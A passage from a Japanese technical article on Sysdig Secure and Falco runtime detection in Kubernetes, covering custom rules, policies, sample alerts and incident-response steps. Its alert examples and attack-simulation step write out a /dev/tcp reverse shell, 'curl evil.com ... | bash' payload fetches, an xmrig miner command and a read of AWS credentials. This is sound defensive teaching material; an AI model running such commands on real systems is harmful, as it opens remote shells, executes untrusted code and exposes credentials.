    大量外部送信検知
    (bytes=%evt.bytes container=%container.name
    dest_ip=%fd.sip dest_port=%fd.sport
    process=%proc.name)
  priority: WARNING
  tags: [network, exfiltration]

- macro: rfc_1918_addresses
  condition: >
    (fd.sip startswith "10." or
     fd.sip startswith "172.16." or
     fd.sip startswith "192.168.")


# ルール7: Kubernetes APIへの不審なアクセス
- rule: Suspicious K8s API Access
  desc: |
    コンテナからのKubernetes API直接アクセスを検知
  condition: >
    outbound_connection and
    container and
    fd.sip = "kubernetes.default.svc.cluster.local" and
    not k8s.pod.name startswith "system-" and
    not container.image.repository in (allowed_k8s_clients)
  output: >
    K8s APIへの不審なアクセス
    (container=%container.name image=%container.image.repository
    pod=%k8s.pod.name process=%proc.name)
  priority: WARNING
  tags: [kubernetes, discovery]

- list: allowed_k8s_clients
  items: [kubectl, helm, flux, argocd]


# ルール8: 特権コンテナの実行（K8s Audit Log）
- rule: Privileged Container Created
  desc: |
    特権コンテナの作成を検知
  condition: >
    kevt and pod and kcreate and
    ka.req.pod.containers.privileged intersects (true) and
    not ka.req.pod.containers.image.repository in (allowed_privileged_images)
  output: >
    特権コンテナ作成
    (user=%ka.user.name pod=%ka.resp.name
    ns=%ka.target.namespace
    images=%ka.req.pod.containers.image)
  priority: WARNING
  source: k8s_audit
  tags: [kubernetes, privilege_escalation]

- list: allowed_privileged_images
  items: [sysdig-agent, falco, node-problem-detector]
```

## 8-3. ルールのデプロイ方法

### 方法1: ConfigMapとして作成

```bash
# カスタムルールをConfigMapとして作成
kubectl create configmap custom-falco-rules \
  --from-file=custom-rules.yaml=./custom-falco-rules.yaml \
  -n sysdig-agent

# Sysdig AgentのDaemonSetに追加のVolumeMountを設定
kubectl patch daemonset sysdig-agent -n sysdig-agent --patch '
spec:
  template:
    spec:
      containers:
      - name: sysdig-agent
        volumeMounts:
        - name: custom-rules
          mountPath: /etc/falco/rules.d
      volumes:
      - name: custom-rules
        configMap:
          name: custom-falco-rules
'

# Agentの再起動
kubectl rollout restart daemonset/sysdig-agent -n sysdig-agent
```

### 方法2: Sysdig UI経由での設定

```
1. Sysdig Secure にログイン
2. Policies > Runtime Policies
3. "Add Policy" or "Create Custom Rule"
4. Rule Editor でYAMLを貼り付け
5. Save & Apply
```

## 8-4. Runtime Policy設定（Sysdig UI）

```yaml
# Sysdig Secure Runtime Policy JSON定義例
{
  "name": "Production High Security Policy",
  "description": "本番環境向けの厳格なランタイムポリシー",
  "version": 2,
  "ruleNames": [
    "Interactive Shell in Production",
    "Read Sensitive File",
    "Crypto Mining Detected",
    "Privilege Escalation Attempt",
    "Package Management in Container",
    "Large Outbound Data Transfer",
    "Suspicious K8s API Access"
  ],
  "actions": [
    {
      "afterEventNs": 0,
      "type": "POLICY_ACTION_CAPTURE"  # Sysdig Captureを取得
    },
    {
      "afterEventNs": 5000000000,  # 5秒後
      "type": "POLICY_ACTION_KILL"  # プロセスをKill
    }
  ],
  "notificationChannelIds": [
    12345,  # Slackチャンネル
    67890   # PagerDuty
  ],
  "scope": {
    "kubernetes.namespace.name": {
      "in": ["production", "staging"]
    },
    "container.image.repository": {
      "notIn": ["sysdig/*", "falco/*"]
    }
  },
  "severity": 4,  # 0-7, 7が最高
  "enabled": true,
  "runbook": "https://wiki.company.com/security/runtime-incident-response"
}
```

## 8-5. Drift Prevention（ドリフト防止）設定

```yaml
# Drift Preventionポリシー例
{
  "name": "Immutable Infrastructure Policy",
  "description": "学習済み動作以外を自動ブロック",
  "type": "drift",
  "learningPeriod": "7d",  # 7日間学習
  "actions": [
    {
      "type": "POLICY_ACTION_KILL",
      "beforeEventNs": 0  # 即座にKill
    }
  ],
  "allowedBehaviors": {
    "processes": {
      "mode": "whitelist",
      "learned": true
    },
    "network": {
      "mode": "whitelist",
      "learned": true
    },
    "filesystem": {
      "mode": "whitelist",
      "learned": true,
      "paths": [
        "/tmp/*",  # 明示的に許可
        "/var/log/*"
      ]
    }
  },
  "scope": {
    "kubernetes.namespace.name": {
      "in": ["production"]
    }
  }
}
```

# 9. 実際のアラート例とインシデント対応

## 9-1. ケース1: リバースシェル攻撃の検知と対応

### アラート詳細

```json
{
  "id": "evt-20231208-001234",
  "timestamp": "2023-12-08T14:32:15.123Z",
  "severity": "CRITICAL",
  "policyName": "Interactive Shell in Production",
  "ruleName": "Terminal shell in container",
  "description": "本番環境のコンテナで対話的シェルが検知されました",

  "event": {
    "type": "spawned_process",
    "process": {
      "name": "bash",
      "cmdline": "bash -i >& /dev/tcp/198.51.100.42/4444 0>&1",
      "pid": 18234,
      "ppid": 15678,
      "parent_name": "php-fpm",
      "parent_cmdline": "php-fpm: pool www",
      "tty": 34816,
      "uid": 33,
      "user": "www-data"
    },
    "container": {
      "id": "d3f4a5b6c789",
      "name": "payment-api-7f8d9c-xk2m9",
      "image": {
        "repository": "mycompany.io/payment-api",
        "tag": "v2.3.1",
        "digest": "sha256:abc123..."
      }
    },
    "kubernetes": {
      "namespace": "production",
      "pod": "payment-api-7f8d9c-xk2m9",
      "deployment": "payment-api",
      "node": "node-worker-03",
      "labels": {
        "app": "payment-api",
        "env": "production",
        "tier": "backend"
      }
    },
    "network": {
      "connection": {
        "source_ip": "10.0.4.156",
        "source_port": 52341,
        "dest_ip": "198.51.100.42",
        "dest_port": 4444,
        "protocol": "tcp"
      }
    }
  },

  "mitreAttack": {
    "tactics": ["Execution", "Command and Control"],
    "techniques": ["T1059.004 - Unix Shell", "T1071.001 - Application Layer Protocol"]
  },

  "actions_taken": [
    "Process killed (PID 18234)",
    "Sysdig Capture created (capture-evt-001234.scap)",
    "Container isolated (network policy applied)",
    "Notification sent to #security-alerts"
  ],

  "capture_id": "capture-evt-001234",
  "runbook": "https://wiki.company.com/security/reverse-shell-response"
}
```

### Sysdig UIでの表示

```
┌────────────────────────────────────────────────────────────┐
│ 🚨 CRITICAL Alert                                          │
│ Terminal shell in container                                │
├────────────────────────────────────────────────────────────┤
│ 時刻: 2023-12-08 14:32:15 JST                              │
│ 優先度: CRITICAL                                            │
│                                                            │
│ 📍 Location                                                 │
│   Namespace: production                                    │
│   Pod: payment-api-7f8d9c-xk2m9                            │
│   Container: payment-api-7f8d9c-xk2m9                      │
│   Node: node-worker-03                                     │
│                                                            │
│ 🔍 Details                                                  │
│   User: www-data (UID: 33)                                 │
│   Process: bash (PID: 18234)                               │
│   Command: bash -i >& /dev/tcp/198.51.100.42/4444 0>&1    │
│   Parent: php-fpm (PID: 15678)                             │
│   Image: mycompany.io/payment-api:v2.3.1                   │
│                                                            │
│ 🌐 Network                                                  │
│   Connection: 10.0.4.156:52341 → 198.51.100.42:4444       │
│                                                            │
│ ⚡ Actions Taken                                            │
│   ✓ Process killed automatically                           │
│   ✓ Sysdig Capture created                                 │
│   ✓ Container isolated                                     │
│   ✓ #security-alerts notified                              │
│                                                            │
│ [View Capture] [Investigate] [Create Incident]            │
└────────────────────────────────────────────────────────────┘
```

### インシデント対応手順

```bash
# 1. Sysdig Captureのダウンロードと分析
sysdig-cli-scanner captures download capture-evt-001234.scap

# Captureファイルの再生（全プロセスツリーを確認）
sysdig -r capture-evt-001234.scap -c proc_tree

# 出力例:
# 1234   php-fpm (master)
#   15678   php-fpm: pool www
#     18234   bash -i >& /dev/tcp/198.51.100.42/4444 0>&1  ← 攻撃
#     18235   curl http://evil.com/malware.sh

# ネットワーク接続履歴
sysdig -r capture-evt-001234.scap -c topconns

# ファイルアクセス履歴
sysdig -r capture-evt-001234.scap evt.type=open and fd.name contains /etc


# 2. 影響範囲の特定
kubectl get pods -n production -l app=payment-api -o wide

# 同じイメージを使用している他のPodを確認
kubectl get pods --all-namespaces -o json | \
  jq '.items[] | select(.spec.containers[].image == "mycompany.io/payment-api:v2.3.1")'


# 3. 侵入経路の調査
# Sysdig UIで「Activity Audit」を確認
# - いつからコンテナが実行されていたか
# - どのユーザーがデプロイしたか
# - 脆弱性スキャン結果は？

# APIログから攻撃リクエストを特定
kubectl logs -n production payment-api-7f8d9c-xk2m9 --previous | \
  grep "POST" | grep "198.51.100.42"


# 4. 緊急対応
# 侵害されたPodを削除
kubectl delete pod -n production payment-api-7f8d9c-xk2m9

# 同じイメージの全Podをスケールダウン（慎重に）
kubectl scale deployment -n production payment-api --replicas=0

# 脆弱性のあるイメージをブロック（Admission Controller）
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: ConfigMap
metadata:
  name: sysdig-admission-controller
  namespace: sysdig-agent
data:
  blocked_images: |
    - "mycompany.io/payment-api:v2.3.1"
EOF


# 5. 復旧
# パッチ適用済みイメージをデプロイ
kubectl set image deployment/payment-api -n production \
  payment-api=mycompany.io/payment-api:v2.3.2-patched

# スケールアップ
kubectl scale deployment -n production payment-api --replicas=3


# 6. 事後分析
# Sysdig UIで「Forensics」ビューを確認
# - 攻撃のタイムライン
# - アクセスされたファイル
# - 実行されたコマンド
# - ネットワーク通信
```

## 9-2. ケース2: 暗号通貨マイニングの検知

### アラート詳細

```json
{
  "id": "evt-20231208-005678",
  "timestamp": "2023-12-08T03:15:42.456Z",
  "severity": "CRITICAL",
  "policyName": "Crypto Mining Detected",
  "ruleName": "Crypto Mining Process",

  "event": {
    "process": {
      "name": "xmrig",
      "cmdline": "./xmrig -o pool.minexmr.com:4444 -u 49Zf3... --tls",
      "pid": 9876,
      "parent_name": "curl",
      "cpu_usage": 98.5,
      "user": "nobody"
    },
    "container": {
      "name": "web-frontend-abc123",
      "image": {
        "repository": "nginx",
        "tag": "latest"
      }
    },
    "kubernetes": {
      "namespace": "default",
      "pod": "web-frontend-abc123"
    },
    "network": {
      "connection": {
        "dest_ip": "198.51.100.100",
        "dest_port": 4444,
        "dest_hostname": "pool.minexmr.com"
      }
    }
  },

  "indicators": {
    "high_cpu_usage": true,
    "suspicious_outbound_connection": true,
    "unknown_binary_execution": true
  }
}
```

### Slack通知例

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🚨 CRITICAL Security Alert
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔴 Crypto Mining Detected

📍 Location:
   • Cluster: production-eks
   • Namespace: default
   • Pod: web-frontend-abc123
   • Node: node-worker-05

⚠️  Details:
   • Process: xmrig (PID: 9876)
   • CPU: 98.5%
   • Connection: pool.minexmr.com:4444
   • User: nobody

✅ Actions Taken:
   • ✓ Process killed
   • ✓ Container stopped
   • ✓ Network isolated
   • ✓ Capture saved

🔗 Links:
   • View in Sysdig: https://app.sysdigcloud.com/...
   • Runbook: https://wiki.company.com/...

@security-oncall please investigate immediately
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

### 対応手順

```bash
# 1. 即座にコンテナを隔離
kubectl label pod -n default web-frontend-abc123 security=quarantine

# NetworkPolicyで通信を遮断
cat <<EOF | kubectl apply -f -
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: quarantine-policy
  namespace: default
spec:
  podSelector:
    matchLabels:
      security: quarantine
  policyTypes:
  - Ingress
  - Egress
  # 全ての通信を拒否
EOF

# 2. フォレンジック情報の収集
kubectl exec -n default web-frontend-abc123 -- ps auxf
kubectl exec -n default web-frontend-abc123 -- netstat -tulpn
kubectl exec -n default web-frontend-abc123 -- ls -la /tmp

# 3. 侵入経路の調査
# コンテナのイベント履歴
kubectl describe pod -n default web-frontend-abc123

# 疑わしいファイルのハッシュ計算
kubectl exec -n default web-frontend-abc123 -- \
  sha256sum /tmp/xmrig

# VirusTotalで検索
# ハッシュ: a1b2c3d4e5f6...

# 4. クリーンアップ
kubectl delete pod -n default web-frontend-abc123

# イメージ再ビルド（脆弱性除去）
# CI/CDパイプラインでSysdig Image Scanを実行
```

## 9-3. ケース3: 機密ファイルアクセスの検知

### アラート詳細

```json
{
  "id": "evt-20231208-009999",
  "timestamp": "2023-12-08T10:45:30.789Z",
  "severity": "WARNING",
  "policyName": "Read Sensitive File",
  "ruleName": "Sensitive File Access",

  "event": {
    "type": "open_read",
    "file": {
      "path": "/root/.aws/credentials",
      "permission": "0600"
    },
    "process": {
      "name": "cat",
      "cmdline": "cat /root/.aws/credentials",
      "pid": 4567,
      "parent_name": "bash",
      "user": "root"
    },
    "container": {
      "name": "admin-tools-xyz789",
      "image": {
        "repository": "admin-tools",
        "tag": "v1.0"
      }
    },
    "kubernetes": {
      "namespace": "ops-tools",
      "pod": "admin-tools-xyz789",
      "serviceAccount": "admin-sa"
    }
  }
}
```

### 対応手順

```bash
# 1. アクセスログの確認
# Sysdig UIで「Activity Audit」を開く
# - 誰がPodを作成したか？
# - kubectl execした履歴は？

# 2. 影響範囲の確認
# AWS認証情報が漏洩した可能性があるため、即座にローテーション
aws iam list-access-keys --user-name compromised-user

# キーを無効化
aws iam update-access-key --access-key-id AKIAXXXXXXXX \
  --status Inactive --user-name compromised-user

# CloudTrailでキーの使用履歴を確認
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=Username,AttributeValue=compromised-user \
  --start-time 2023-12-08T10:00:00Z

# 3. Secretsの再作成
# KubernetesシークレットをRotation
kubectl delete secret aws-credentials -n ops-tools
kubectl create secret generic aws-credentials \
  --from-literal=access-key-id=AKIANEWKEY... \
  --from-literal=secret-access-key=newSecretKey... \
  -n ops-tools

# 4. Pod再作成
kubectl delete pod -n ops-tools admin-tools-xyz789
```

## 9-4. ケース4: Kubernetes API不正アクセス

### アラート詳細（K8s Audit Log）

```json
{
  "id": "evt-20231208-012345",
  "timestamp": "2023-12-08T16:20:15.123Z",
  "severity": "WARNING",
  "source": "k8s_audit",
  "ruleName": "Unauthorized K8s API Access",

  "event": {
    "audit": {
      "verb": "list",
      "objectRef": {
        "resource": "secrets",
        "namespace": "kube-system"
      },
      "user": {
        "username": "system:serviceaccount:default:app-sa",
        "groups": ["system:serviceaccounts", "system:authenticated"]
      },
      "sourceIPs": ["10.0.3.45"],
      "userAgent": "curl/7.68.0",
      "responseStatus": {
        "code": 200
      }
    },
    "kubernetes": {
      "pod": "suspicious-app-abc123",
      "namespace": "default"
    }
  }
}
```

### 対応手順

```bash
# 1. ServiceAccountの権限確認
kubectl get rolebindings,clusterrolebindings \
  --all-namespaces -o json | \
  jq '.items[] | select(.subjects[]?.name == "app-sa")'

# 2. 過剰な権限を削除
kubectl delete clusterrolebinding suspicious-binding

# 3. 最小権限のRoleを作成
cat <<EOF | kubectl apply -f -
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: app-role
  namespace: default
rules:
- apiGroups: [""]
  resources: ["configmaps"]
  verbs: ["get", "list"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: app-rolebinding
  namespace: default
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: Role
  name: app-role
subjects:
- kind: ServiceAccount
  name: app-sa
  namespace: default
EOF

# 4. Pod再作成（新しい権限を適用）
kubectl delete pod -n default suspicious-app-abc123
```

## 9-5. インシデント対応ワークフロー

```
┌─────────────────────────────────────────┐
│ 1. Alert Triggered                      │
│    - Sysdig Secure検知                  │
│    - 自動アクション実行                  │
└─────────────────────────────────────────┘
              ↓
┌─────────────────────────────────────────┐
│ 2. Notification                         │
│    - Slack, PagerDuty, Email            │
│    - オンコールエンジニアへ通知          │
└─────────────────────────────────────────┘
              ↓
┌─────────────────────────────────────────┐
│ 3. Initial Triage (5分以内)             │
│    - Sysdig UIで詳細確認                │
│    - 重大度判定                          │
│    - 影響範囲の初期評価                  │
└─────────────────────────────────────────┘
              ↓
┌─────────────────────────────────────────┐
│ 4. Containment (15分以内)               │
│    - Pod削除/隔離                        │
│    - NetworkPolicy適用                  │
│    - 認証情報ローテーション              │
└─────────────────────────────────────────┘
              ↓
┌─────────────────────────────────────────┐
│ 5. Investigation                        │
│    - Sysdig Captureの分析               │
│    - ログ調査                            │
│    - 侵入経路の特定                      │
└─────────────────────────────────────────┘
              ↓
┌─────────────────────────────────────────┐
│ 6. Eradication & Recovery               │
│    - 脆弱性パッチ適用                    │
│    - イメージ再ビルド                    │
│    - クリーンな環境で再デプロイ          │
└─────────────────────────────────────────┘
              ↓
┌─────────────────────────────────────────┐
│ 7. Post-Incident Review                 │
│    - インシデントレポート作成            │
│    - ルール改善                          │
│    - 再発防止策                          │
└─────────────────────────────────────────┘
```

# 10. ベストプラクティスとまとめ

## 10-1. Sysdig運用のベストプラクティス

### チューニングのベストプラクティス

```yaml
# 良い例：複数フィールドでの例外設定
- rule: Launch Remote File Copy Tools in Container
  exceptions:
    - name: proc_cmdline_pcmdline_image
      fields: [proc.cmdline, proc.pcmdline, container.image.repository]
      comps: [startswith, startswith, endswith]
      values:
        - - rsync -av --remove-source-files
          - python app.py
          - myregistry.io/myapp/worker
  append: true

# 悪い例：単一フィールドでの広すぎる例外
- rule: Launch Remote File Copy Tools in Container
  exceptions:
    - name: proc_name_only
      fields: [proc.name]
      values:
        - - rsync  # ← すべてのrsyncを許可してしまう（危険）
  append: true
```

### 段階的な導入戦略

```
Phase 1: Monitor Mode (1-2週間)
  ├─ すべてのルールを有効化
  ├─ アラートのみ（アクションなし）
  └─ 誤検知の特定とチューニング

Phase 2: Test in Non-Prod (2-4週間)
  ├─ 開発/ステージング環境で有効化
  ├─ Kill/Stop アクションを有効化
  └─ 影響範囲の確認

Phase 3: Production Rollout
  ├─ 重要度の高いNamespaceから段階的に適用
  ├─ Drift Preventionの学習期間設定
  └─ 24/7モニタリング体制

Phase 4: Continuous Improvement
  ├─ 月次でルール効果をレビュー
  ├─ 新しい脅威に対応したルール追加
  └─ MITRE ATT&CKカバレッジの向上
```

## 10-2. 監視すべき主要メトリクス

```yaml
# Sysdigダッシュボードで追跡すべきKPI

Security Metrics:
  - Critical/High Alerts per Day: < 10
  - Mean Time to Detect (MTTD): < 5 minutes
  - Mean Time to Respond (MTTR): < 30 minutes
  - False Positive Rate: < 5%
  - Policy Coverage: > 95% of workloads

Operational Metrics:
  - Agent Health: 100% of nodes
  - Agent CPU Usage: < 5% per node
  - Agent Memory Usage: < 500MB per node
  - Event Processing Lag: < 30 seconds
  - Capture Success Rate: > 99%

Compliance Metrics:
  - CIS Benchmark Score: > 90%
  - Vulnerable Images in Production: 0
  - Privileged Containers: < 1%
  - Root User Containers: 0
```

## 10-3. よくある失敗パターンと対策

| 失敗パターン | 問題 | 対策 |
|------------|------|------|
| **オートチューナーの乱用** | 本物の脅威を自動で無視 | 手動チューニングのみ使用 |
| **過度に広い例外** | セキュリティギャップの発生 | 最低2フィールドで具体的に |
| **コメントなし** | 誰がなぜ追加したか不明 | 日付・担当者・理由を記載 |
| **Audit(Info)のチューニング** | 監査証跡の喪失 | Infoレベルは除外しない |
| **ルールの無効化** | 検知能力の低下 | 例外で対応、無効化は最終手段 |

## 10-4. Sysdig vs 従来IDS/IPS 最終比較

```
シナリオ: コンテナ内でリバースシェルが実行される

┌──────────────────────────────────────────────────────┐
│ 従来のNIDS (Snort, Suricata等)                        │
├──────────────────────────────────────────────────────┤
│ ❌ 暗号化されたHTTPS内 → 検知不可                      │
│ ❌ コンテキスト不足（IPアドレスのみ）                  │
│ ❌ East-Westトラフィック非対応                         │
│ ❌ 自動対応不可                                        │
└──────────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────────┐
│ Sysdig Secure                                        │
├──────────────────────────────────────────────────────┤
│ ✅ システムコールレベルで検知                          │
│ ✅ 完全なコンテキスト（Pod, Image, User, Command等）  │
│ ✅ プロセスを即座にKill                                │
│ ✅ Captureで完全なフォレンジック                       │
│ ✅ Kubernetes環境にネイティブ対応                      │
│ ✅ MITRE ATT&CK自動マッピング                         │
└──────────────────────────────────────────────────────┘
```

## 10-5. 次のステップ

```bash
# 1. トライアル環境でテスト
# https://sysdig.com/company/free-trial/

# 2. サンプルアプリで攻撃シミュレーション
kubectl apply -f https://raw.githubusercontent.com/sysdiglabs/\
  security-playground/main/vulnerable-app.yaml

# 3. 攻撃を実行してSysdigの検知を確認
kubectl exec -it vulnerable-app -- bash
# コンテナ内で:
curl http://evil.com/reverse-shell.sh | bash

# 4. Sysdig UIでアラート、Capture、Forensicsを確認

# 5. カスタムルールを作成
# 自社環境特有の脅威に対応したルールを追加

# 6. CI/CDパイプラインに統合
# Image Scanning, IaC Scanning を追加

# 7. 本番環境へ段階的ロールアウト
```

---

# まとめ

## なぜコンテナ時代にSysdigが必要か

1. **可視性の革命**
   - ネットワークパケット → システムコール
   - IPアドレス → リッチなコンテキスト
   - 暗号化通信も完全に可視化

2. **Kubernetesネイティブ**
   - Pod, Namespace, ServiceAccountを理解
   - K8s Audit Logとの統合
   - 動的環境に完全対応

3. **リアルタイム防御**
   - IDS（検知）+ IPS（防御）
   - Drift Prevention（不変インフラ強制）
   - 自動レスポンス（Kill, Stop, Pause）

4. **開発者フレンドリー**
   - YAMLでルール記述
   - Git管理、CI/CD統合
   - Infrastructure as Code

5. **規制対応**
   - CIS, PCI-DSS, HIPAA, SOC 2
   - 自動レポート生成
   - コンプライアンス継続監視

## 最後に

従来のIDS/IPSはネットワーク境界防御の時代の産物です。コンテナ・Kubernetes・マイクロサービスの世界では、**ランタイム脅威検知**が新しいセキュリティの標準となります。

Sysdigは単なるセキュリティツールではなく、**クラウドネイティブアプリケーションを守るための包括的プラットフォーム**です。

---

## 参考リンク

- [Sysdig公式サイト](https://sysdig.com/)
- [Falco Documentation](https://falco.org/docs/)
- [MITRE ATT&CK for Containers](https://attack.mitre.org/matrices/enterprise/containers/)
- [CIS Kubernetes Benchmark](https://www.cisecurity.org/benchmark/kubernetes)
- [Kubernetes Security Best Practices](https://kubernetes.io/docs/concepts/security/)

---

この記事が、コンテナ時代のセキュリティ戦略を考える上での参考になれば幸いです。
質問やフィードバックがあれば、コメント欄でお知らせください。
